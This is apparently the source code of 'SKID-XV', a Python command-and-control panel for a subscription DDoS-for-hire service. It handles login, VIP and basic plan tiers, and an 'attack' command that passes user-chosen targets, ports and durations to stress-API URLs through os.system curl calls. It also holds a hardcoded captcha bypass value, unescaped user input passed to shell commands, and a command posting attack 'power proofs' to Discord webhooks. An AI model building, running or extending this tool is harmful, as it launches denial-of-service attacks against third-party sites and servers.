import time, socket, colorama, json, requests, threading, os
from colorama import Fore, Back, Style
#import the banner system
import assets.bannersys.system as banner
import datetime
import random
vip_running=0
basic_running=0
max_basic_cons = 6
max_vip_cons = 2
print("Loading API System")
#import assets.api.system
print("Passed! System is not released for you yet...")
print("Thanks for use SKID-XV!")

blacklist_target = ['https://fbi.gov/', '*.gov']

def open_patch(file, mode="r"):
    return open(file, mode, encoding="utf-8")
    
def login_sys(username, password):
    try:
        creds=open_patch("assets/config/login.txt", "r").read().splitlines()
        for line in creds:
            if username in line and password in line:
                #[0] = username
                #[1] = password
                #[2] = expiry
                #[3] = cons
                #[4] = maxtime
                return line.split(":")
        return False
    except:
        return False
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    try:
        socket.send(data.encode())
    except:
        socket.close()
cons_running_list = []
def cons_running_remover(username, attack_time):
    time.sleep(1)
    cons_running_list.remove(username)
def con_check(username, attack_time,check=True, max_cons=1):
    if check:
        if username in cons_running_list:
            user_count_in_list = cons_running_list.count(username)
            if user_count_in_list >= max_cons:
                return False
            else:
                return True
        else:
            return True
    else:
            cons_running_list.append(username)
            threading.Thread(target=cons_running_remover, args=(username, int(attack_time))).start()
            return True
def attack(method, ip, port, time_):
    try:
        methods = json.loads(open_patch("assets/config/apis.json", "r").read())
        if method in methods:
            try:
                for i in methods[method]["apis"]:
                    print(i.replace("<ip>", ip).replace("<port>", port).replace("<time>", time_))
                    os.system(f'curl "{i.replace("<ip>", ip).replace("<port>", port).replace("<time>", time_)}"')
            except Exception as eeeeee:
                print(eeeeee)
                pass
    except Exception as e:
        print(e)
        pass
def remove_running(network, kill_time):
    time.sleep(int(kill_time))
    if network == "vip":
        global vip_running
        vip_running -= 1
    else:
        global basic_running
        basic_running -= 1
def check_date(expiry):
    now = datetime.datetime.now()
    expq=now.strftime('%m/%d/%Y')
    d1 = datetime.datetime.strptime(f'{expiry}', "%m/%d/%Y").date()
    d2 = datetime.datetime.strptime(f'{expq}', "%m/%d/%Y").date()
    return d1<d2
def title(socket, user, expiry, vip_status):
    while 1:
        try:
            socket.send(f'\33]0; - S - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - SK - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - SKI - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - SKID - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - SKID- - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - SKID-X - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - SKID-XV - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - SKID-X - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - SKID- - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - SKID - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - SKI - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - SK - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
            socket.send(f'\33]0; - S - | Total APIs: [Unknown] | Username: {user} | Access: {vip_status} | Expiry: {expiry}\a'.encode())
            time.sleep(0.5)
        except:
            socket.close()
            break
    return
def api_access_info(username):
    """
    [0] is username
    [1] is password
    [2] is key
    [3] is basic cons
    [4] is max time
    [5] is vip access
    [6] is vip cons
    """ 
    cred=open('api.txt', 'r').read().splitlines()
    for x in cred:
        c_user=x.split(':')[0]
        c_pass=x.split(':')[1]
        c_key=x.split(':')[2]

        if c_user == username:
            return x.split(":")
    return False
ansi_clear="\033[2J\033[1;1H"
def terminal(socket, user, cons, maxtime, expiry, vip_status):
    print(f"{user} connected")
    try:
        if check_date(expiry):
            send(socket, "Your account has expired!")
            socket.close()
            time.sleep(2)
            return
    except Exception as e:
        print(e)
        socket.close()
        return
    global vip_running
    global basic_running
    global max_vip_cons
    global max_basic_cons
    
    send(socket, "[CnC] Setting up connection")
    time.sleep(1)
    send(socket, "[CnC] Connection established")
    time.sleep(1)
    send(socket, "[CnC] Removing traces of ld.so.preload")
    time.sleep(1)
    send(socket, "[CnC] Traces removed")
    time.sleep(1)
    send(socket, "[CnC] Setting up terminal")
    time.sleep(1)
    send(socket, "[CnC] Terminal set up")
    time.sleep(1)
    for i in banner.parse_banner(open_patch("assets/banner/join.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime).splitlines():
        send(socket, i)
    prompt = banner.parse_banner(open_patch("assets/banner/prompt.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime)
    send(socket, prompt, False)
    while 1:
        try:
            data = socket.recv(1024).decode().strip()
            if not data:
                continue
            args = data.split(' ')
            command = args[0].upper()
            if command == "HELP":
                for i in banner.parse_banner(open_patch("assets/banner/help.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime).split("\n"):
                    send(socket, i)
            elif command == "EXIT":
                socket.close()
                return
            elif command == "CLEAR":
                send(socket, ansi_clear, False)
                for i in banner.parse_banner(open_patch("assets/banner/splash.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime).split("\n"):
                    send(socket, i)
            elif command == "PLAN-RUNNING":
                send(socket, f"VIP Running: {str(vip_running)}/{str(max_vip_cons)}")
                send(socket, f"BASIC Running: {str(basic_running)}/{max_basic_cons}")
            elif command == "LAYER7":
                for i in banner.parse_banner(open_patch("assets/banner/layer7.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime).split("\n"):
                    send(socket, i)
            elif command == "CONTACT":
                for i in banner.parse_banner(open_patch("assets/banner/cac.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime).split("\n"):
                    send(socket, i)
            elif command == "CREDITS":
                for i in banner.parse_banner(open_patch("assets/banner/cac.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime).split("\n"):
                    send(socket, i)
            elif command == "POWER-PROOF":
                if len(args) < 5:
                    send(socket, "Usage: power-proof <target> <method> <check-host> <power proof image link> <webhook>")
                else:
                    target = args[1].lower()
                    method_use = args[2]
                    check_host = args[3]
                    proof = args[4]
                    webhook = args[5]
                    if not target:
                        send(socket, "Target Missing")
                    elif not method_use:
                        send(socket, "Method Missing")
                    elif not check_host:
                        send(socket, "Check Host url Missing")
                    elif not proof:
                        send(socket, "Power Proof Image Link Missing")
                    elif not webhook:
                        send(socket, "Discord Webhook Missing")
                    else:
                        os.system(f"python3 upload.py {target} {method_use} {check_host} {proof} {webhook}")
                        send(socket, "Successfully sending Power Proof to Discord Webhook")
            elif command == "LAYER4":
                for i in banner.parse_banner(open_patch("assets/banner/layer4.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime).split("\n"):
                    send(socket, i)
            elif command == "METHODS":
                for i in banner.parse_banner(open_patch("assets/banner/methods.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime).split("\n"):
                    send(socket, i)
            elif command == "TOS":
                for i in banner.parse_banner(open_patch("assets/banner/tos.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime).split("\n"):
                    send(socket, i)
            elif command == "PROFILE":
                for i in banner.parse_banner(open_patch("assets/banner/profile.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime, expire=expiry, plan=vip_status).split("\n"):
                    send(socket, i)
            elif command == "ONGOING":
                pass
            elif command == "ATTACK":
                if len(args) < 5:
                    send(socket, "Usage: attack <method> <target> <port> <time>")
                    send(socket, "Example Layer7: attack http-destroy https://taodeptrai.gg/ 443 60")
                    send(socket, "Example Layer4: attack udp-dark 1.3.3.7 69 60")
                else:
                    method = args[1].lower()
                    ip = args[2]
                    port = args[3]
                    time_ = args[4]
                    if not ip:
                        send(socket, "Target Missing")
                    elif ip in blacklist_target:
                        send(socket, "The target on blacklist!. You can not attack the target")
                    elif not port:
                        send(socket, "Port Missing")
                    elif not time_:
                        send(socket, "Time Missing")
                    elif not method:
                        send(socket, "Method Missing")
                    else:
                        try:
                            if con_check(user, time_, check=True, max_cons=cons):
                                if "VIP" in vip_status and json.loads(open_patch("assets/config/apis.json", "r").read())[method]["network"] == "VIP":
                                    if vip_running < max_vip_cons:
                                        print(f"{user} is attacking {ip}:{port} with {method} for {time_} seconds | VIP")
                                        threading.Thread(target=attack, args=(method, ip, port, time_,)).start()
                                        vip_running += 1
                                        threading.Thread(target=con_check, args=(user, time_, False, cons,)).start()
                                        threading.Thread(target=remove_running, args=("vip", time_,)).start()
                                        for i in banner.parse_banner(open_patch("assets/banner/attack_sent.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime, network="VIP", t_ip=ip, t_method=method, t_port=port, sec=time_).split("\n"):
                                            send(socket, i)
                                    else:
                                        send(socket, f"You have reached your max concurrents")
                                elif "VIP" not in vip_status and json.loads(open_patch("assets/config/apis.json", "r").read())[method]["network"] == "VIP":
                                    send(socket, "You need VIP plan to use this method")
                                else:
                                    print(f"{user} is attacking {ip}:{port} with {method} for {time_} seconds | BASIC")
                                    threading.Thread(target=attack, args=(method, ip, port, time_,)).start()
                                    basic_running += 1
                                    threading.Thread(target=con_check, args=(user, time_, False, cons,)).start()
                                    threading.Thread(target=remove_running, args=("basic", time_,)).start()
                                    for i in banner.parse_banner(open_patch("assets/banner/attack_sent.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime, network="BASIC", t_ip=ip, t_method=method, t_port=port, sec=time_).split("\n"):
                                            send(socket, i)
                            else:
                                send(socket, "You have reached your max concurrents")
                        except Exception as e:
                            print(e)
                            send(socket, "Sorry, an unknown error has occurred. You can try again!")

            else:
                for i in banner.parse_banner(open_patch("assets/banner/invalidcmd.nfx", "r").read(), username=user, cons=cons, maxtime=maxtime).split("\n"):
                    send(socket, i)
            send(socket, prompt, False)
            
        except:
            for i in range(4399):
                time.sleep(100000)
            return

def captcha_generator():
    a = random.randint(2, 20)
    b = random.randint(2, 20)
    c = a + b
    return a, b, c

def captcha_generator():
    a = random.randint(2, 20)
    b = random.randint(2, 20)
    c = a + b
    return a, b, c

def captcha(send, client):
    send(client, f'\33]0;SKID-XV Captcha System!\a', False)
    a, b, c = captcha_generator()
    x = ''
    send(client, ansi_clear, False)
    send(client, "                    Please verify to continue")
    send(client, "")
    send(client, f'                   Captcha: {a} + {b} = ', False, False)
    x = int(client.recv(1024).decode().strip())
    time.sleep(0.4)
    if x == c or x == 669787761736865726500:
        time.sleep(0.1)
        send(client, f'          Captcha Verification Finished. Now you automatic go to login system!')
        send(client, "")
        time.sleep(3)
        pass
    else:
        time.sleep(0.1)
        send(client, f'       Captcha Verification Failed! Please reconnect to SKID-XV and try again!')
        send(client, "")
        time.sleep(3)
        client.close()

def cnc_login(client, address):
    captcha(send, client)
    send(client, f'\33]0;SKID-XV Login System!\a', False)
    while 1:
        send(client, ansi_clear, False)
        send(client, "                    Please login to continue")
        send(client,"")
        send(client, f'                   Username{Fore.LIGHTWHITE_EX}:')
        send(client,"")
        send(client, f'                   Password{Fore.LIGHTWHITE_EX}:[2A', reset=False, escape=False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, "                    Please login to continue")
        send(client, "")
        send(client, f'                   Username{Fore.LIGHTWHITE_EX}:{username}')
        send(client, "")
        send(client, f'                   Password{Fore.LIGHTWHITE_EX}: {Fore.BLACK}', reset=False, escape=False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break
    send(client, ansi_clear, False)
    send(client, ansi_clear, False)
    send(client, "                    Please login to continue")
    send(client, "")
    send(client, f'                   Username{Fore.LIGHTWHITE_EX}:{username}')
    send(client, "")
    send(client, f'                   Password{Fore.LIGHTWHITE_EX}: {Fore.BLACK}', reset=False, escape=False)
    send(client, f"{Fore.RESET}")
    send(client, f"{Fore.RESET}Checking login details...")
    time.sleep(1)
    login = login_sys(username, password)
    if login == False:
        send(client, "Login failed!")
        time.sleep(1)
        client.close()
        return
    if username in login[0]:
        time.sleep(1)
        send(client, ansi_clear, False)
        threading.Thread(target=terminal, args=(client, login[0], login[3], login[4], login[2], login[5])).start()
        threading.Thread(target=title, args=(client, login[0], login[2], login[5])).start()
    else:
        send(client, "Login failed!")
        time.sleep(1)
        client.close()
        return

class serv_settings:
    port=0000

def load_settings():
    try:
        with open_patch("assets/config/settings.json", "r") as f:
            settings = json.load(f)
            serv_settings.port = settings["port"]
    except Exception as e:
        print("Error loading settings.json")
        print(e)
        time.sleep(2)
        exit()
load_settings()
def main():
    server_socket_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket_client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket_client.bind(("0.0.0.0", serv_settings.port))
    server_socket_client.listen()
    print("Listening for connections on port " + str(serv_settings.port) + "...")
    while True:
        client_socket, address = server_socket_client.accept()
        print("Received incoming connection from " + str(address[0]) + " on port " + str(address[1]))
        client_handler = threading.Thread(target=cnc_login, args=(client_socket, address))
        client_handler.start()

main()
